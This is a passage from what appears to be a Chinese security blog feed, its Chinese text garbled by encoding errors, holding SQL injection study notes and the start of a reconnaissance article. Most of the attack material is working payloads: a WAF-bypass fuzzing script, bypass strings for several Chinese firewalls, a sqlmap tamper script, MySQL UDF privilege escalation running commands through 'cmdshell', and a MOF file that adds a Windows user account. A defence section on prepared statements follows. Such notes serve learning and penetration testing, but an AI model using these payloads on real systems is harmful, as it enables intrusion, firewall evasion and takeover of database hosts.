information_schema.SCHEMATA'</span></span><br><span class="line">sql_arr=<span class="string">"/*!&#123;&#125;*/#"</span>.format(sql).split()</span><br><span class="line"><span class="comment"># è®¾ç½®è¯·æ±‚çš„headers</span></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> FUZZ:</span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> FUZZ:</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> FUZZ:</span><br><span class="line">            <span class="keyword">for</span> d <span class="keyword">in</span> FUZZ:</span><br><span class="line">                <span class="keyword">for</span> e <span class="keyword">in</span> FUZZ:</span><br><span class="line">                    fuzz_here=a + b + c + d + e</span><br><span class="line">                    <span class="comment"># RAW: PYLOAD = "/*!union" + fuzz_here + "select 1,2*/#"</span></span><br><span class="line">                    PYLOAD = fuzz_here.join(sql_arr)</span><br><span class="line">                    <span class="comment">#  exit(0)</span></span><br><span class="line">                    urlp = url + PYLOAD</span><br><span class="line">                    res = requests.get(urlp, headers=header)</span><br><span class="line">                    <span class="comment"># ä½¿ç”¨foræ’åˆ—ç»„åˆfuzzå­—å…¸å¹¶è¯·æ±‚é¡µé¢, å› ä¸ºç»„åˆåä¸ä¸€å®šç¬¦åˆsqlè¯­å¥ï¼Œæ‰€ä»¥éœ€è¦ç”¨æ­£å¸¸é¡µé¢ç‰¹å¾åšåˆ¤æ–­</span></span><br><span class="line">                    <span class="keyword">if</span> <span class="string">'wait'</span> <span class="keyword">in</span> res.text:</span><br><span class="line">                        <span class="keyword">print</span> (<span class="string">"[*]URL:"</span> + urlp + <span class="string">u"è¿‡ç‹—ï¼"</span>)</span><br><span class="line">                        <span class="comment"># å¦‚æœè¿”å›çš„é¡µé¢ä¸­åŒ…å«waitå­—ç¬¦ï¼Œåˆ™æ‰“å°å¹¶å†™å‡ºè¿‡ç‹—payloadã€‚</span></span><br></pre></td></tr></table></figure><h2 id="ç»•è¿‡æŠ¤å«ç¥"><a href="#ç»•è¿‡æŠ¤å«ç¥" class="headerlink" title="ç»•è¿‡æŠ¤å«ç¥"></a>ç»•è¿‡æŠ¤å«ç¥</h2><p>è¯¦ç»†è¯·å‚è€ƒ<a href="https://www.t00ls.net/articles-46165.html" target="_blank" rel="noopener">Bypass æŠ¤å«ç¥SQLæ³¨å…¥é˜²å¾¡ï¼ˆå¤šå§¿åŠ¿ï¼‰</a></p><h3 id="00æˆªæ–­"><a href="#00æˆªæ–­" class="headerlink" title="%00æˆªæ–­"></a>%00æˆªæ–­</h3><p>ASPX:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/sql.aspx?id=1%00and 1=2 union select 1,2,column_name from information_schema.columns</span><br></pre></td></tr></table></figure><p>PHP:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/sql.php?id=1/*%00*/union select 1,schema_name,3 from information_schema.schemata</span><br></pre></td></tr></table></figure><h3 id="Unicodeç¼–ç "><a href="#Unicodeç¼–ç " class="headerlink" title="Unicodeç¼–ç "></a>Unicodeç¼–ç </h3><p>é€‚ç”¨äºIISæœåŠ¡å™¨<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.204.132/sql.aspx?id=1 and 1=2 union s%u0045lect 1,2,column_name from information_schema.columns</span><br></pre></td></tr></table></figure></p><h3 id="HPP"><a href="#HPP" class="headerlink" title="HPP"></a>HPP</h3><p>ASPXä¸­æ¥å—å‚æ•°é¡ºåºä¸ºä¸ºGETï¼ŒPOSTï¼ŒCOOKIEï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.204.132/sql.aspx?id=1 and 1=2 union/*</span><br><span class="line"></span><br><span class="line">POSTï¼šid=*/select 1,column_name,3 from information_schema.columns</span><br></pre></td></tr></table></figure><h3 id="å·"><a href="#å·" class="headerlink" title="%å·"></a>%å·</h3><p>IIS+ASPä¸­è§£æä¼šå»æ‰%ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/sql.asp?id=1 and 1=2 un%ion select 1,2,column_name from information_schema.columns</span><br></pre></td></tr></table></figure><h3 id="ç¼“å†²åŒºæº¢å‡º-1"><a href="#ç¼“å†²åŒºæº¢å‡º-1" class="headerlink" title="ç¼“å†²åŒºæº¢å‡º"></a>ç¼“å†²åŒºæº¢å‡º</h3><p>åŒ360çš„ç¼“å†²åŒºæº¢å‡ºï¼Œ(Select 0xA*49099)ã€‚</p><h2 id="ç»•è¿‡å®‰å…¨ç‹—"><a href="#ç»•è¿‡å®‰å…¨ç‹—" class="headerlink" title="ç»•è¿‡å®‰å…¨ç‹—"></a>ç»•è¿‡å®‰å…¨ç‹—</h2><p>åŒ360ä¸»æœºå«å£«çš„å†…è”æ³¨é‡Šç»•è¿‡</p><h2 id="åˆ†å—ä¼ è¾“"><a href="#åˆ†å—ä¼ è¾“" class="headerlink" title="åˆ†å—ä¼ è¾“"></a>åˆ†å—ä¼ è¾“</h2><p>è¯¦è§<a href="https://anemone.top/HTTP-HTTPåè®®å¤ä¹ /">HTTPåè®®å¤ä¹ </a>åˆ†å—ä¼ è¾“éƒ¨åˆ†</p><h2 id="SQLMap-Tamperå†™æ³•"><a href="#SQLMap-Tamperå†™æ³•" class="headerlink" title="SQLMap Tamperå†™æ³•"></a>SQLMap Tamperå†™æ³•</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"><span class="keyword">from</span> lib.core.settings <span class="keyword">import</span> UNICODE_ENCODING</span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dependencies</span><span class="params">()</span>:</span></span><br><span class="line">  <span class="keyword">pass</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span><span class="params">(payload, **kwargs)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> payload:</span><br><span class="line">        payload=payload.replace(<span class="string">"UNION ALL SELECT"</span>,<span class="string">"union%23!@%23$%%5e%26%2a()%60~%0a/*!12345select*/"</span>)</span><br><span class="line">        payload=payload.replace(<span class="string">"UNION SELECT"</span>,<span class="string">"union%23!@%23$%%5e%26%2a()%60~%0a/*!12345select*/"</span>)</span><br><span class="line">        payload=payload.replace(<span class="string">" FROM "</span>,<span class="string">"/*!%23!@%23$%%5e%26%2a()%60~%0afrOm*/"</span>)</span><br><span class="line">        payload=payload.replace(<span class="string">"CONCAT"</span>,<span class="string">"/*!12345CONCAT*/"</span>)</span><br><span class="line">        payload=payload.replace(<span class="string">"CAST("</span>,<span class="string">"/*!12345CAST(*/"</span>)</span><br><span class="line">        payload=payload.replace(<span class="string">"CASE"</span>,<span class="string">"/*!12345CASE*/"</span>)</span><br><span class="line">        payload=payload.replace(<span class="string">"DATABASE()"</span>,<span class="string">"database/**/()"</span>)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure><h1 id="ä¸åŒç”¨æˆ·çš„æƒé™"><a href="#ä¸åŒç”¨æˆ·çš„æƒé™" class="headerlink" title="ä¸åŒç”¨æˆ·çš„æƒé™"></a>ä¸åŒç”¨æˆ·çš„æƒé™</h1><h2 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h2><p>æ™®é€šç”¨æˆ·æœ‰information_schemaè¡¨çš„è¯»æƒé™ï¼Œä½†æ²¡æœ‰mysqlè¡¨çš„è¯»æƒé™</p><h2 id="MSSQL"><a href="#MSSQL" class="headerlink" title="MSSQL"></a>MSSQL</h2><p>å¾ˆå¤æ‚ï¼Œè¯¦ç»†çœ‹<a href="https://paper.tuisec.win/detail/9146d3bd2335703" target="_blank" rel="noopener">æ·±ç§‹ä¹‹å¤œ360é¢è¯•æœ‰æ„Ÿ</a></p><h1 id="å†™æ–‡ä»¶"><a href="#å†™æ–‡ä»¶" class="headerlink" title="å†™æ–‡ä»¶"></a>å†™æ–‡ä»¶</h1><p>éœ€è¦è§£é™¤<code>secure-file-priv=</code><br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">'æ–‡ä»¶å†…å®¹'</span> <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">'æ–‡ä»¶è·¯å¾„'</span></span><br><span class="line"><span class="keyword">select</span> <span class="string">'æ–‡ä»¶å†…å®¹'</span> <span class="keyword">into</span> <span class="keyword">dumpfile</span> <span class="string">'æ–‡ä»¶è·¯å¾„'</span></span><br></pre></td></tr></table></figure></p><h1 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h1><h2 id="ç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°ææƒï¼ˆUDFï¼‰"><a href="#ç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°ææƒï¼ˆUDFï¼‰" class="headerlink" title="ç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°ææƒï¼ˆUDFï¼‰"></a>ç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°ææƒï¼ˆUDFï¼‰</h2><h3 id="è·å–UDF-dllçš„hexç¼–ç "><a href="#è·å–UDF-dllçš„hexç¼–ç " class="headerlink" title="è·å–UDF.dllçš„hexç¼–ç "></a>è·å–UDF.dllçš„hexç¼–ç </h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select hex(load_file(%USER%\\Desktop\\udf.dll)) into dumpfile &apos;%USER%\\Desktop\\udf.txt&apos;;</span><br></pre></td></tr></table></figure><h3 id="ä¿å­˜udf-dllåˆ°ç›®æ ‡ä¸»æœº"><a href="#ä¿å­˜udf-dllåˆ°ç›®æ ‡ä¸»æœº" class="headerlink" title="ä¿å­˜udf.dllåˆ°ç›®æ ‡ä¸»æœº"></a>ä¿å­˜udf.dllåˆ°ç›®æ ‡ä¸»æœº</h3><p>è‹¥æ•°æ®åº“ç‰ˆæœ¬ä¸º5.0ä»¥ä¸‹å°†å…¶ä¿å­˜åˆ°<code>C:\Windows\</code>æˆ–<code>C:\Windows\System32\</code>ï¼Œå¦åˆ™ä¿å­˜åˆ°<code>@@basedir\lib\plugin\</code></p><p>ä½¿ç”¨<code>select &#39;xxx&#39; into dumpfile &#39;C:/MySQL/lib/plugin/::$INDEX_ALLOCATION&#39;;</code>æ–°å»ºæ–‡ä»¶å¤¹(è¿™é‡Œæˆ‘æ²¡æˆåŠŸï¼Œç½‘ä¸Šè¯´ç¡®å®ä¸æˆåŠŸ)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE Temp_udf(udf BLOB);</span><br><span class="line">INSERT into Temp_udf values (unhex(&apos;$shellcode&apos;));   #$shellcodeä¸ºhex(udf.dll)</span><br><span class="line">SELECT udf FROM Temp_udf INTO DUMPFILE &apos;C:/MySQL/lib/plugin/udf.dll&apos;;</span><br></pre></td></tr></table></figure><h3 id="ä½¿ç”¨ç”¨æˆ·å‡½æ•°ææƒ"><a href="#ä½¿ç”¨ç”¨æˆ·å‡½æ•°ææƒ" class="headerlink" title="ä½¿ç”¨ç”¨æˆ·å‡½æ•°ææƒ"></a>ä½¿ç”¨ç”¨æˆ·å‡½æ•°ææƒ</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">create function cmdshell returns string soname &apos;udf.dll&apos;;  #æ­¤å¤„ä¸èƒ½å¡«ç»å¯¹è·¯å¾„ åªèƒ½æ˜¯dllå</span><br><span class="line">select * from mysql.func;                  #çœ‹çœ‹cmdshell functionæ˜¯å¦åˆ›ç«‹ï¼Œåˆ›ç«‹å°±ç»§ç»­</span><br><span class="line">select hex(cmdshell(&apos;whoami&apos;));            #è¿è¡Œå„ç§å‘½ä»¤ææƒ</span><br></pre></td></tr></table></figure><h2 id="mofææƒ"><a href="#mofææƒ" class="headerlink" title="mofææƒ"></a>mofææƒ</h2><p>ç”±äº<strong>c:/windows/system32/wbem/mof/</strong>ç›®å½•ä¸‹çš„ <strong>nullevt.mof</strong> æ–‡ä»¶ï¼Œæ¯åˆ†é’Ÿéƒ½ä¼šåœ¨ä¸€ä¸ªç‰¹å®šçš„æ—¶é—´å»æ‰§è¡Œä¸€æ¬¡ï¼Œå› æ­¤å¯ä»¥ä½¿ç”¨dumpfileå°†shellå†™å…¥ï¼Œç„¶åç”±ç³»ç»Ÿæ‰§è¡Œï¼ˆæœ‰ç‚¹åƒlinuxçš„crontabï¼‰</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#pragma namespace(&quot;\\\\.\\root\\subscription&quot;)</span><br><span class="line"> </span><br><span class="line">instance of __EventFilter as $EventFilter</span><br><span class="line">&#123;</span><br><span class="line">    EventNamespace = &quot;Root\\Cimv2&quot;;</span><br><span class="line">    Name  = &quot;filtP2&quot;;</span><br><span class="line">    Query = &quot;Select * From __InstanceModificationEvent &quot;</span><br><span class="line">            &quot;Where TargetInstance Isa \&quot;Win32_LocalTime\&quot; &quot;</span><br><span class="line">            &quot;And TargetInstance.Second = 5&quot;;</span><br><span class="line">    QueryLanguage = &quot;WQL&quot;;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line">instance of ActiveScriptEventConsumer as $Consumer</span><br><span class="line">&#123;</span><br><span class="line">    Name = &quot;consPCSV2&quot;;</span><br><span class="line">    ScriptingEngine = &quot;JScript&quot;;</span><br><span class="line">    ScriptText =</span><br><span class="line">&quot;var WSH = new ActiveXObject(\&quot;WScript.Shell\&quot;)\nWSH.run(\&quot;net.exe user anemone /add\&quot;)&quot;;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line">instance of __FilterToConsumerBinding</span><br><span class="line">&#123;</span><br><span class="line">    Consumer   = $Consumer;</span><br><span class="line">    Filter = $EventFilter;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>ä¸Šä¼ ä¹‹åç”¨mysqlå†™æ–‡ä»¶ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(&apos;c:/www/nullevt.mof&apos;) into dumpfile &apos;c:/windows/system32/wbem/mof/nullevt.mof&apos;</span><br></pre></td></tr></table></figure><h1 id="é˜²å¾¡â€”â€”ä½¿ç”¨é¢„ç¼–è¯‘è¯­å¥"><a href="#é˜²å¾¡â€”â€”ä½¿ç”¨é¢„ç¼–è¯‘è¯­å¥" class="headerlink" title="é˜²å¾¡â€”â€”ä½¿ç”¨é¢„ç¼–è¯‘è¯­å¥"></a>é˜²å¾¡â€”â€”ä½¿ç”¨é¢„ç¼–è¯‘è¯­å¥</h1><p>é¢„å…ˆç¼–è¯‘sqlï¼Œåé¢çš„æ³¨å…¥è¯­å¥åªèƒ½åšæ™®é€šå­—ç¬¦ä¸²æŸ¥è¯¢ï¼Œé¢„ç¼–è¯‘è¯­å¥ä¸èƒ½ç”¨äºorderby</p><p>SQLå†™æ³•ï¼š</p><ol><li><p>é¢„ç¼–è¯‘</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">prepare ins from &apos;insert into t select ?,?&apos;;</span><br></pre></td></tr></table></figure></li><li><p>æ‰§è¡Œ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set @a=999,@b=&apos;hello&apos;;</span><br><span class="line">execute ins using @a,@b;</span><br><span class="line">select * from t;</span><br></pre></td></tr></table></figure></li><li><p>é‡Šæ”¾</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">deallocate prepare ins;</span><br></pre></td></tr></table></figure></li></ol><p>ä¸‰æ¬¡äº¤äº’ï¼š</p><p><img src="/sqli-SQLæ³¨å…¥æ€»ç»“/1551840783777.png" alt="1551840783777"></p><p>Pythonå†™æ³•ï¼Œpythonå¹¶ä¸æ”¯æŒMySQLçš„é¢„ç¼–è¯‘è¯­å¥ï¼ˆç¬¬ä¸‰æ–¹åº“oursqlæ”¯æŒï¼‰ï¼Œåªæ˜¯å°†å­—ç¬¦ä¸²è½¬ä¹‰åæ”¾åˆ°æ•°æ®åº“æŸ¥è¯¢ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cursor.execute(<span class="string">'insert into user (name,password) value (%s,%s)'</span>,(name,password))</span><br></pre></td></tr></table></figure><p>Javaå†™æ³•ï¼Œéœ€è¦å¼€å¯é¢„ç¼–è¯‘åŠŸèƒ½ï¼ˆuseServerPrepStmts=trueï¼‰ï¼Œç¨‹åºä¸æ•°æ®åº“3æ¬¡äº¤äº’prepare-&gt;execute-&gt;close stmt</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    Class.forName(name);<span class="comment">//æŒ‡å®šè¿æ¥ç±»å‹</span></span><br><span class="line">    conn = DriverManager.getConnection(url, user, password);<span class="comment">//è·å–è¿æ¥</span></span><br><span class="line">    pst = conn.prepareStatement(<span class="string">"SELECT * FROM users WHERE `name`=?"</span>);<span class="comment">//å‡†å¤‡æ‰§è¡Œè¯­å¥</span></span><br><span class="line">    pst.setString(<span class="number">1</span>,<span class="string">"9ian1i"</span>);</span><br><span class="line">    rs = pst.executeQuery();</span><br><span class="line">    <span class="keyword">while</span> (rs.next())&#123;</span><br><span class="line">        String name = rs.getString(<span class="string">"name"</span>);</span><br><span class="line">        System.out.println(name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>phpå†™æ³•</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$name=$_GET[<span class="string">'name'</span>];</span><br><span class="line">$mysqli = <span class="keyword">new</span> mysqli(<span class="string">'127.0.0.1'</span>,<span class="string">'root'</span>,<span class="string">'root'</span>,<span class="string">'test'</span>);</span><br><span class="line">$mysqli_stmt=$mysqli-&gt;prepare(<span class="string">"select username, password from test where username=?"</span>);</span><br><span class="line">$mysqli_stmt-&gt;bind_param(<span class="string">'s'</span>, $name);</span><br><span class="line">$mysqli_stmt-&gt;execute();</span><br><span class="line">$mysqli_stmt-&gt;bind_result($username, $password);</span><br><span class="line"><span class="keyword">while</span>($mysqli_stmt-&gt;fetch())&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"$username--$password"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h1 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h1><ul><li><p>åç§MySQLæŠ¥é”™æ³¨å…¥ï¼Œ<a href="https://www.cnblogs.com/xishaonian/p/6102750.html" target="_blank" rel="noopener">https://www.cnblogs.com/xishaonian/p/6102750.html</a></p></li><li><p>æ·±å…¥æ¢ç©¶å®½å­—èŠ‚æ³¨å…¥æ¼æ´ä¸ä¿®è¡¥åŸç†ï¼Œ<a href="https://blog.csdn.net/qq_29419013/article/details/81205291" target="_blank" rel="noopener">https://blog.csdn.net/qq_29419013/article/details/81205291</a> </p></li><li><p>Bypass ngx_lua_waf SQLæ³¨å…¥é˜²å¾¡ï¼ˆå¤šå§¿åŠ¿ï¼‰ï¼Œ<a href="https://www.t00ls.net/articles-45736.html" target="_blank" rel="noopener">https://www.t00ls.net/articles-45736.html</a></p></li><li><p>Bypass 360ä¸»æœºå«å£«SQLæ³¨å…¥é˜²å¾¡ï¼ˆå¤šå§¿åŠ¿ï¼‰ï¼Œ<a href="https://www.t00ls.net/articles-45943.html" target="_blank" rel="noopener">https://www.t00ls.net/articles-45943.html</a></p></li><li><p>Bypass æŠ¤å«ç¥SQLæ³¨å…¥é˜²å¾¡ï¼ˆå¤šå§¿åŠ¿ï¼‰ï¼Œ<a href="https://www.t00ls.net/articles-46165.html" target="_blank" rel="noopener">https://www.t00ls.net/articles-46165.html</a> </p></li><li><p>æ·±ç§‹ä¹‹å¤œ360é¢è¯•æœ‰æ„Ÿï¼Œ<a href="https://paper.tuisec.win/detail/9146d3bd2335703" target="_blank" rel="noopener">https://paper.tuisec.win/detail/9146d3bd2335703</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> Webå®‰å…¨-SQLæ³¨å…¥ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL </tag>
            
            <tag> æ³¨å…¥ </tag>
            
            <tag> wafç»•è¿‡ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä¿¡æ¯æ”¶é›†æ€è·¯æ•´ç†</title>
      <link href="/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%80%9D%E8%B7%AF%E6%95%B4%E7%90%86/"/>
      <url>/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%80%9D%E8%B7%AF%E6%95%B4%E7%90%86/</url>
      
        <content type="html"><![CDATA[<p>ä¿¡æ¯æ”¶é›†æ˜¯æ¸—é€æµ‹è¯•çš„ç¬¬ä¸€æ­¥ï¼Œæœ¬æ–‡æ€»ç»“ç›®å‰ä¿¡æ¯æ”¶é›†çš„å…·ä½“æ“ä½œæ­¥éª¤ã€‚</p><h1 id="ç½‘ç«™ä¿¡æ¯"><a href="#ç½‘ç«™ä¿¡æ¯" class="headerlink" title="ç½‘ç«™ä¿¡æ¯"></a>ç½‘ç«™ä¿¡æ¯</h1><h2 id="whoisä¿¡æ¯"><a href="#whoisä¿¡æ¯" class="headerlink" title="whoisä¿¡æ¯"></a>whoisä¿¡æ¯</h2><p>å¯ä»¥æ”¶é›†åˆ°çš„ä¿¡æ¯æœ‰ï¼š</p><ul><li>è”ç³»äºº</li><li>é‚®ç®±ï¼ˆå¯ä»¥åˆ°ç¤¾å·¥åº“è¿›ä¸€æ­¥æŸ¥è¯¢ï¼‰</li><li>ç”µè¯</li></ul><p>æ”¶é›†é€”å¾„æœ‰ï¼š</p><ul><li><a href="http://whois.chinaz.com/" target="_blank" rel="noopener">http://whois.chinaz.com/</a> ï¼ˆç«™é•¿ä¹‹å®¶ï¼‰</li><li><a href="https://who.is/" target="_blank" rel="noopener">https://who.is/</a> ï¼ˆå›½å¤–ï¼‰</li><li><a href="https://x.threatbook.cn/ï¼ˆé€šè¿‡é‚®ç®±æŸ¥è¯¢å…¶ä»–çš„ç«™ç‚¹ï¼‰" target="_blank" rel="noopener">https://x.threatbook.cn/ï¼ˆé€šè¿‡é‚®ç®±æŸ¥è¯¢å…¶ä»–çš„ç«™ç‚¹ï¼‰</a></li><li><a href="https://dns.aizhan.com/" target="_blank" rel="noopener">https://dns.aizhan.com/</a> ï¼ˆIPåæŸ¥åŸŸåï¼‰</li><li>å‘½ä»¤<code>whois anemone.top</code> </li></ul><a id="more"></a><h2 id="å¤‡æ¡ˆä¿¡æ¯"><a href="#å¤‡æ¡ˆä¿¡æ¯" class="headerlink" title="å¤‡æ¡ˆä¿¡æ¯"></a>å¤‡æ¡ˆä¿¡æ¯</h2><p>ä»ç„¶æ˜¯æ”¶é›†è”ç³»äººã€å…¬å¸ç­‰ä¿¡æ¯</p><p>é€”å¾„æœ‰ï¼š</p><ul><li><a href="https://www.tianyancha.com/brand/b59c12209" target="_blank" rel="noopener">https://www.tianyancha.com/brand/b59c12209</a> ï¼ˆå¤©çœ¼æŸ¥ï¼‰</li><li><a href="http://www.gsxt.gov.cnï¼ˆå›½å®¶ä¿¡ç”¨å…¬ç¤ºï¼‰" target="_blank" rel="noopener">http://www.gsxt.gov.cnï¼ˆå›½å®¶ä¿¡ç”¨å…¬ç¤ºï¼‰</a></li><li><a href="http://icp.chinaz.comï¼ˆç«™é•¿ä¹‹å®¶ï¼Œå¯ä»¥æŸ¥è¯¢å…¶ä»–å¤‡æ¡ˆç«™ç‚¹ï¼‰" target="_blank" rel="noopener">http://icp.chinaz.comï¼ˆç«™é•¿ä¹‹å®¶ï¼Œå¯ä»¥æŸ¥è¯¢å…¶ä»–å¤‡æ¡ˆç«™ç‚¹ï¼‰</a></li></ul><h2 id="DNSä¿¡æ¯"><a href="#DNSä¿¡æ¯" class="headerlink" title="DNSä¿¡æ¯"></a>DNSä¿¡æ¯</h2><p>DNSç”¨æ¥è·å–ç½‘ç«™IPï¼Œä½†è‹¥ç½‘ç«™ä½¿ç”¨äº†CDNæœåŠ¡åˆ™æ— æ•ˆã€‚</p><ul><li><code>dig anemone.top</code> # Linux</li><li><code>dig @1.1.1.1 anemone.top</code> # ä½¿ç”¨1.1.1.1dnsè§£æ</li><li><code>nslookup anemone.top</code> # Windows</li></ul><h2 id="æŒ‡çº¹ä¿¡æ¯"><a href="#æŒ‡çº¹ä¿¡æ¯" class="headerlink" title="æŒ‡çº¹ä¿¡æ¯"></a>æŒ‡çº¹ä¿¡æ¯</h2><p>è·å–ä¸­é—´ä»¶ç±»å‹å’Œç‰ˆæœ¬ï¼Œé€šè¿‡httpå¤´éƒ¨è·å–ï¼Œä¹Ÿå¯ä»¥ç”¨whatwebå·¥å…·ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ whatweb anemone.top</span><br></pre></td></tr></table></figure><p>æ ¹æ®ç›®å½•ã€å¤´æ–‡ä»¶ã€ç‰¹æœ‰æ–‡ä»¶ç­‰è¯†åˆ«CMSï¼š</p><ul><li><a href="http://www.yunsee.cn/finger.html" target="_blank" rel="noopener">http://www.yunsee.cn/finger.html</a></li><li><a href="http://whatweb.bugscaner.com/look/" target="_blank" rel="noopener">http://whatweb.bugscaner.com/look/</a></li><li><a href="https://www.test404.com/post-1618.html" target="_blank" rel="noopener">Test404è½»é‡CMSæŒ‡çº¹è¯†åˆ«</a> </li><li><code>nmap -p80,443 --script=http-waf-fingerprint ip</code></li><li><code>nmap -p80,443 --script=http-waf-fingerprint ip</code></li></ul><h1 id="æœåŠ¡å™¨çš„ç›¸å…³ä¿¡æ¯"><a href="#æœåŠ¡å™¨çš„ç›¸å…³ä¿¡æ¯" class="headerlink" title="æœåŠ¡å™¨çš„ç›¸å…³ä¿¡æ¯"></a>æœåŠ¡å™¨çš„ç›¸å…³ä¿¡æ¯</h1><h2 id="å¯»æ‰¾çœŸå®IP"><a href="#å¯»æ‰¾çœŸå®IP" class="headerlink" title="å¯»æ‰¾çœŸå®IP"></a>å¯»æ‰¾çœŸå®IP</h2><p>å…ˆç”¨å¤šåœ°pingåˆ¤æ–­ç½‘ç«™æ˜¯å¦å­˜åœ¨CDNï¼š</p><ul><li><a href="http://tool.chinaz.com/dns/" target="_blank" rel="noopener">http://tool.chinaz.com/dns/</a></li></ul><p>è‹¥å­˜åœ¨CDNåˆ™å°è¯•å¦‚ä¸‹åŠæ³•å¯»æ‰¾çœŸå®IPï¼š</p><ul><li>åˆ†ç«™åŸŸå</li><li><p>DNSå†å²è®°å½•</p><ul><li><a href="https://securitytrails.com/" target="_blank" rel="noopener">https://securitytrails.com/</a></li><li><a href="https://x.threatbook.cn/" target="_blank" rel="noopener">https://x.threatbook.cn/</a></li></ul><ul><li><a href="https://www.virustotal.com/#/home/search" target="_blank" rel="noopener">VirusTotal</a></li></ul></li><li><p>ä¸Šä¼ 